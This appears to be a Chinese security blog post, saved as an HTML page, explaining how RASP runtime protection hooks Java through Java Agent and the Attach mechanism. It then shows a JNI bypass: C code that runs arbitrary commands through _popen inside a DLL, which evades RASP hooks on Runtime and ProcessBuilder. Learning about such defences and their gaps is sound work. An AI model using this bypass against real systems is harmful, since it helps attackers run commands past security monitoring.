@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>浅谈RASP原理及绕过 | Timind's café</title><meta name="author" content="Timind"><meta name="copyright" content="Timind"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1-前言这几天有点沉浸在面经的海洋中了，无意之中看到了Z3r0佬提供的ct红队面经，里面就提到了一个非常熟悉但又陌生的概念——RASP防护，笔者遂浅学了一些关于RASP的工作原理及绕过方式，下面是本人学习笔记。【如有错误，还请纠正】 2-RASP介绍【官方】RASP是一种安全技术，旨在通过在应用程序运行时实施保护机制来增强应用程序的安全性。它使得应用程序能够实时监控和防御潜在的攻击，而不依赖于外部">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈RASP原理及绕过">
+<meta property="og:url" content="http://timind-sec.github.io/posts/%E6%B5%85%E8%B0%88RASP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Timind&#39;s café">
+<meta property="og:description" content="1-前言这几天有点沉浸在面经的海洋中了，无意之中看到了Z3r0佬提供的ct红队面经，里面就提到了一个非常熟悉但又陌生的概念——RASP防护，笔者遂浅学了一些关于RASP的工作原理及绕过方式，下面是本人学习笔记。【如有错误，还请纠正】 2-RASP介绍【官方】RASP是一种安全技术，旨在通过在应用程序运行时实施保护机制来增强应用程序的安全性。它使得应用程序能够实时监控和防御潜在的攻击，而不依赖于外部">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://timind-sec.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-05-22T10:42:04.000Z">
+<meta property="article:modified_time" content="2026-08-13T21:17:24.463Z">
+<meta property="article:author" content="Timind">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://timind-sec.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "浅谈RASP原理及绕过",
+  "url": "http://timind-sec.github.io/posts/%E6%B5%85%E8%B0%88RASP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/",
+  "image": "http://timind-sec.github.io/img/butterfly-icon.png",
+  "datePublished": "2026-05-22T10:42:04.000Z",
+  "dateModified": "2026-08-13T21:17:24.463Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Timind",
+      "url": "http://timind-sec.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://timind-sec.github.io/posts/%E6%B5%85%E8%B0%88RASP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '浅谈RASP原理及绕过',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/url(https:/c-ssl.duitang.com/uploads/item/201902/27/20190227220253_hhrtf.jpg));"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Timind's café</span></a><a class="nav-page-title" href="/"><span class="site-name">浅谈RASP原理及绕过</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">浅谈RASP原理及绕过</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-22T10:42:04.000Z" title="发表于 2026-05-22 18:42:04">2026-05-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-13T21:17:24.463Z" title="更新于 2026-08-14 05:17:24">2026-08-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h1><p>这几天有点沉浸在面经的海洋中了，无意之中看到了Z3r0佬提供的ct红队面经，里面就提到了一个非常熟悉但又陌生的概念——RASP防护，笔者遂浅学了一些关于RASP的工作原理及绕过方式，下面是本人学习笔记。【如有错误，还请纠正】</p>
+<h1 id="2-RASP介绍"><a href="#2-RASP介绍" class="headerlink" title="2-RASP介绍"></a>2-RASP介绍</h1><p>【官方】RASP是一种安全技术，旨在通过在应用程序运行时实施保护机制来增强应用程序的安全性。它使得应用程序能够实时监控和防御潜在的攻击，而不依赖于外部的安全设备或控制措施。因为从 JDK 1.5 开始，Java 提供了一种动态代理机制，允许代理检测在 JVM 中运行的服务，通过插桩的方式修改方法的字节码，而 RASP 实际上就是通过 hook 系统的关键函数实现防护。</p>
+<p>其实主要说白了就是，RASP他不同于平时我们所见的waf，常规的waf只针对于攻击者的直接攻击流量，也就是各个路由中添加一道利用提前写好各种规则的防火墙，然而这种只判断直接流量的机制，如今却容易被攻击者精心构造的各种编码、混淆的payload绕过，所以就有了这么一个防御机制：RASP，它通过javaagent机制，随时跟踪攻击者的行为，比如：用户输入直接拼进 SQL → 拦截，是合法参数拼进 SQL →，那么就放行；</p>
+<p>所以相比于waf，RASP更<strong>能区分 “真攻击” 和 “正常业务”，误报极低</strong>。</p>
+<p>那么RASP是怎么实现对系统的hook的，以下为两种常见的hook方式：</p>
+<h2 id="2-1-java-Agent"><a href="#2-1-java-Agent" class="headerlink" title="2-1-java Agent"></a>2-1-java Agent</h2><p>Java Agent 是一种特定于 Java 编程语言的工具，用于在 Java 虚拟机（JVM）启动时或运行中对 Java 应用程序进行监控、修改和增强。Java Agent 的功能主要依赖于 Java Instrumentation API，该 API 允许开发人员在字节码级别对 Java 类进行操作和修改。</p>
+<p>通过java agent技术进行类的字节码修改最主要使用的就是Java Instrumentation API</p>
+<h2 id="2-2-Java-Agent-的使用场景"><a href="#2-2-Java-Agent-的使用场景" class="headerlink" title="2-2-Java Agent 的使用场景"></a>2-2-<strong>Java Agent 的使用场景</strong></h2><ol>
+<li>性能监控：通过跟踪方法调用、执行时间和资源使用情况，提高应用程序的性能分析能力。</li>
+<li>安全性增强：在方法调用过程中插入安全检查，确保访问控制和输入验证。</li>
+<li>日志记录和审计：自动捕捉方法入口、出口和异常信息，减少显式日志记录的需求。</li>
+<li>测试与调试：为测试工具提供支持，允许自定义行为的动态插入。</li>
+<li>静态分析：在类被加载时进行静态分析，提供编译时无法发现的错误和警告。</li>
+</ol>
+<h3 id="2-2-1Demo"><a href="#2-2-1Demo" class="headerlink" title="2-2-1Demo"></a>2-2-1Demo</h3><p>&#x2F;&#x2F;MyAgent.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAgent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * JVM 启动时优先执行的 agent 入口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;===== 我的 JavaAgent 启动成功 =====&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Agent 参数：&quot;</span> + agentArgs);</span><br><span class="line">        System.out.println(<span class="string">&quot;Instrumentation：&quot;</span> + inst);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加一个类转换器，用于修改字节码</span></span><br><span class="line">        inst.addTransformer((loader, className, classBeingRedefined, protectionDomain, classfileBuffer) -&gt; &#123;</span><br><span class="line">            <span class="comment">// 只打印被加载的类名</span></span><br><span class="line">            System.out.println(<span class="string">&quot;加载类：&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 不修改字节码，仅观察</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;AgentMain.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;主程序开始运行！&quot;</span>);</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是测试方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建文件 <code>META-INF/MANIFEST.MF</code></p>
+<p>manifest</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: MyAgent</span><br><span class="line">Can-Redefine-Classes: true</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键说明</strong>：</p>
+<ul>
+<li><code>Premain-Class</code> 必须指向你的 Agent 入口类</li>
+<li>这是 JavaAgent 能被识别的核心配置</li>
+</ul>
+<h3 id="2-2-2编译＋打包"><a href="#2-2-2编译＋打包" class="headerlink" title="2-2-2编译＋打包"></a>2-2-2编译＋打包</h3><p><strong>第一步：编译</strong>（编译java文件）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac *.java</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：打包成agent.jar，用于加载在指定jvm中</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvfm agent.jar META-INF/MANIFEST.MF *.class</span><br></pre></td></tr></table></figure>
+
+<p><strong>第三步：运行主程序中，带上-javaagent参数</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:agent.jar=testParam AgentMain</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">===== 我的 JavaAgent 启动成功 =====</span></span><br><span class="line">Agent 参数：testParam</span><br><span class="line">Instrumentation：sun.instrument.InstrumentationImpl@xxxx</span><br><span class="line">加载类：java/lang/Object</span><br><span class="line">加载类：java/io/Serializable</span><br><span class="line">加载类：java/lang/Comparable</span><br><span class="line"><span class="bullet">...</span></span><br><span class="line"><span class="bullet"></span>加载类：AgentMain</span><br><span class="line">主程序开始运行！</span><br><span class="line">这是测试方法</span><br></pre></td></tr></table></figure>
+
+<p><code>java.instrument.Instrumentation</code> ：提供了用于字节码操作的 API 访问，允许开发者注册自定义的类转换器。</p>
+<p><strong><code>ClassFileTransformer</code></strong>: 这是一个接口，用于定义如何转换类的字节码。开发者可以实现此接口，在 <code>transform</code> 方法中添加自定义的字节码逻辑。</p>
+<p><code>premian</code> 会在 JVM 调用 main 函数前进行调用，<code>Instrumentation inst</code> 是管道，可以通过它注册类转换器并进行字节码操作。调用 <code>inst.addTransformer</code> 是注册一个新的 <code>ClassFileTransformer</code> 实现，重写了 transform 方法，当加载每个类时，JVM 会调用这个方法，允许对类的字节码进行修改。在这里面添加了 <code>System.out.println(&quot;Class loaded: &quot; + className);</code> ，这样当任何类被加载时，就会在控制台打印出该类的名称。</p>
+<p>加入agent后，jvm会先经过agent的逻辑再执行主程序</p>
+<h2 id="2-2-Attach机制"><a href="#2-2-Attach机制" class="headerlink" title="2-2-Attach机制"></a>2-2-Attach机制</h2><h3 id="2-2-1-Attach是什么？"><a href="#2-2-1-Attach是什么？" class="headerlink" title="2-2-1 Attach是什么？"></a>2-2-1 Attach是什么？</h3><p>Attach机制相当于动态加载agent程序，即<strong>热加载</strong>，无需重启jvm，即可当JavaAgent注入时，动态的修改字节码。上面所写的Premain方法还得在jvm启动前挂在agent，这既是Attach一大优势。</p>
+<h3 id="2-2-2-Attach实现原理"><a href="#2-2-2-Attach实现原理" class="headerlink" title="2-2-2 Attach实现原理"></a>2-2-2 Attach实现原理</h3><p>Java 进程启动时，JVM 自动创建 Attach Listener 线程，创建本地通信文件，阻塞等待外部连接，不占用业务线程资源。</p>
+<p>客户端程序通过进程 PID，调用<code>VirtualMachine.attach(pid)</code>发起连接：</p>
+<ul>
+<li>客户端创建套接字客户端，连接目标 JVM 监听端口</li>
+<li>校验进程归属、权限，建立通信通道</li>
+</ul>
+<p>连接成功后，客户端发送固定协议指令：指定 Agent jar 路径、启动参数，请求 JVM 加载代理。</p>
+<p>Attach Listener 捕获指令后，发起<strong>安全点停顿</strong>：</p>
+<p>让所有业务线程运行到安全位置暂停执行，避免字节码修改时线程并发读写引发异常。</p>
+<p>JVM 读取指定 jar 包，识别<code>MANIFEST.MF</code>中<code>Agent-Class</code>配置，实例化代理类，调用<strong>agentmain</strong>方法，同时传入 Instrumentation 实例。</p>
+<p>在 agentmain 中调用<code>inst.addTransformer()</code>注册自定义<code>ClassFileTransformer</code>，绑定字节码修改逻辑。</p>
+<p>调用<code>inst.retransformClasses(Class&lt;?&gt;... classes)</code>：</p>
+<ol>
+<li>取出 JVM 方法区中已存在的原始字节码</li>
+<li>交给注册的转换器做 ASM 等字节码编辑</li>
+<li>将新字节码替换原有 Class 定义</li>
+</ol>
+<p>字节码替换完成，退出安全点，唤醒所有业务线程。后续调用类方法，都会执行修改后的字节码逻辑。</p>
+<p>指令执行完毕，客户端与 JVM 断开套接字连接，Attach Listener 回归监听状态。</p>
+<h1 id="3-RASP绕过"><a href="#3-RASP绕过" class="headerlink" title="3-RASP绕过"></a>3-RASP绕过</h1><p>RASP能获取到最后Sink函数的执行点，所以不管多么底层的业务逻辑，只要是RASP涉及到的，不管怎么编码绕过，都会被拦截，查找文章发现，绕过方式主要有两种</p>
+<ol>
+<li>寻找没被限制的类或者函数进行绕过，即黑名单绕过</li>
+<li>利用更底层的技术进行绕过如C代码</li>
+</ol>
+<h2 id="3-1-JNI绕过"><a href="#3-1-JNI绕过" class="headerlink" title="3-1-JNI绕过"></a>3-1-JNI绕过</h2><p>JNI 是<strong>本地编程接口</strong>（java native interface），它使得在 Java 虚拟机（VM）内部运行的 Java 代码能够与用 <strong>C、C++、汇编</strong>等其他语言编写的应用程序和库进行<strong>互操作（interoperate）</strong>。</p>
+<p>其实主要是java开发的过程中，java语言还是需要C，C++代码等这样的底层代码来实现，这里仅以C代码进行探讨。JNI这种机制的设计就是让java能调用C程序，这个C程序并不是C代码生成出来的exe，而是编译成dll动态链接库。</p>
+<h3 id="3-1-1-JNI实现"><a href="#3-1-1-JNI实现" class="headerlink" title="3-1-1 JNI实现"></a>3-1-1 JNI实现</h3><p>网上拿的高人于斯的图，还是蛮直观的</p>
+<p><img src="https://img2023.cnblogs.com/blog/3450378/202411/3450378-20241110183836095-1019462815.png" alt="img"></p>
+<p>其实主要的流程就是自己先声明一个native恶意方法，然后编译成.h文件，再和.c文件（用于实现本地方法）共同编译生成动态链接库&#x2F;共享库，然后JVM再通过System.loadLibrary来加载这个共享库，实现native恶意方法的调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Command</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">exec</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后利用 javac 生成 h 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -<span class="built_in">cp</span> . .\Command.java -h org.example.Command</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后编写对应的恶意C代码，用于后续将命令执行并将执行结果呈现在窗口中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;org_example_Command.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* cmd, <span class="type">char</span>* result)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span> * <span class="number">12</span>];</span><br><span class="line">    FILE* pipe = _popen(cmd, <span class="string">&quot;r&quot;</span>);<span class="comment">// 【关键】执行命令，打开管道读取输出</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(pipe)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fgets(buffer, <span class="number">128</span>, pipe)) &#123;</span><br><span class="line">            <span class="built_in">strcat</span>(result, buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    _pclose(pipe);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_org_example_Command_exec</span><span class="params">(JNIEnv* env, jobject class_object, jstring jstr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span> result[<span class="number">1024</span> * <span class="number">12</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    execmd(cstr, result);</span><br><span class="line">    (*env)-&gt;ReleaseStringUTFChars(env, jstr, cstr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随后进到.\org\example目录中运行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I <span class="string">&quot;$&#123;JAVA_HOME&#125;\include&quot;</span> -I <span class="string">&quot;$&#123;JAVA_HOME&#125;\include\win32&quot;</span> -shared -<span class="keyword">static</span>-libgcc -o cmd.dll Command.c</span><br></pre></td></tr></table></figure>
+
+<p>获得dll文件</p>
+
+
+
+
+<p>还是很牛福的一个机制，而且这样我们就成功绕过了Runtime，ProcessBuilder等恶意类的直接调用.</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io">Timind</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io/posts/%E6%B5%85%E8%B0%88RASP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/">http://timind-sec.github.io/posts/%E6%B5%85%E8%B0%88RASP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://timind-sec.github.io" target="_blank">Timind's café</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/%E6%96%B0%E6%89%8B%E7%B3%BB%E5%88%97--%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B/" title="新手系列--迷你天猫商城系统代码审计流程"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">新手系列--迷你天猫商城系统代码审计流程</div></div><div class="info-2"><div class="info-item-1">一、项目介绍迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。 所有页面均兼容IE10及以上现代浏览器 本项目地址：https://gitee.com/project_team/Tmall-demo/ 二、项目部署①该实验环境jdk版本为openjdk_8u65，java8即可，打开项目文件后，在pom.xml中使用maven clean清除缓存并导入依赖包。 ②然后数据库配置如下，在application.properties中修改你数据库对应的配置，并运行phpstudy的mysql服务，这里我选择的是MySQL5.7.26  ③然后运行该springboot项目，访问http://127.0.0.1:8088/tmall/admin，登录账号密码默认为admin/123456。  登录...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Timind</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">1-前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-RASP%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">2-RASP介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-java-Agent"><span class="toc-number">2.1.</span> <span class="toc-text">2-1-java Agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 